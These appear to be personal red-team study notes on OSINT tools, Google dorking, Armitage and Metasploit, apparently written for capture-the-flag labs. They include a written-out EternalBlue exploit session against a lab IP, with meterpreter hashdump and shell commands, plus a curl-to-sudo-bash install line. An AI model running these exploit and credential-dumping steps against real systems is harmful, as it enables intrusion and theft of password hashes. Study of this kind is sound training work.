## OSINT

Open source intelligence

## Tools

`whois` to query the WHOIS database
`nslookup`, `dig`, or `host` to query DNS servers

## Search sites

https://www.exploit-db.com/google-hacking-database
Ex Google: intext:"index of" ".sql"

How would you search using Google for xls indexed for http://clinic.thmredteam.com?
filetype:xls site:clinic.thmredteam.com

## Threat Intelligence Platform

Threat Intelligence Platform will launch a series of tests from malware checks to WHOIS and DNS queries.
https://threatintelligenceplatform.com/

## Censys

Censys Search can provide a lot of information about IP addresses and domains.
https://search.censys.io/

## Shodan

Shodan: Passive Reconnaissance
https://www.shodan.io/host/

## Recon-ng
Recon-ng is a framework that helps automate the OSINT work.
Recon-ng is a full-featured reconnaissance framework designed with the goal of providing a powerful environment to conduct open source web-based reconnaissance quickly and thoroughly.
https://github.com/lanmaster53/recon-ng

## Armitage

```
cd /opt/armitage/release/unix
systemctl start postgresql && systemctl status postgresql
```

```
su ubuntu
msfdb --use-defaults delete
msfdb --use-defaults init
exit
```

Start teamserver

```
cd /opt/armitage/release/unix
./teamserver 10.10.195.117 password
```

Start Armitage

```
cd /opt/armitage/release/unix
./armitage
```

https://www.cyb3rm3.com/1ntr0t0c2
https://www.offensive-security.com/metasploit-unleashed/msfvenom/
https://www.hackingarticles.in/msfvenom-tutorials-beginners/
https://medium.com/@jiteshofficial2004/net-sec-challenge-tryhackme-walkthrough-simplest-way-d5a9bb951b90

## MITRE ATT&CK

https://attack.mitre.org/

Exempel
https://attack.mitre.org/groups/G0096/
https://mitre-attack.github.io/attack-navigator//#layerURL=https%3A%2F%2Fattack.mitre.org%2Fgroups%2FG0096%2FG0096-enterprise-layer.json

## LOLBAS

Living off the land refers to the use of dual-use tools, which are either already installed in the victims’ environment, or are admin, forensic or system tools used maliciously.
Living Off The Land Binaries, Scripts and Libraries
The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.
https://lolbas-project.github.io/

## Metasploit

Penetration testing framework
https://www.metasploit.com/
https://www.cyb3rm3.com/1ntr0t0c2

```
msfconsole

msf5 > search eternalblue
msf5 > use 2
msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhost 10.10.0.169
msf5 exploit(windows/smb/ms17_010_eternalblue) > set lport 8888
msf5 exploit(windows/smb/ms17_010_eternalblue) > run
meterpreter > hashdump
meterpreter > pwd
meterpreter > dir
meterpreter > execute -f cmd.exe -c -i
meterpreter > shell
meterpreter > sysinfo
```

## Meterpreter

Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection stagers and is extended over the network at runtime.
https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

## Ubuntu

Version
```
lsb_release -a
```

Node
```
curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -
sudo apt-get install -y nodejs
```
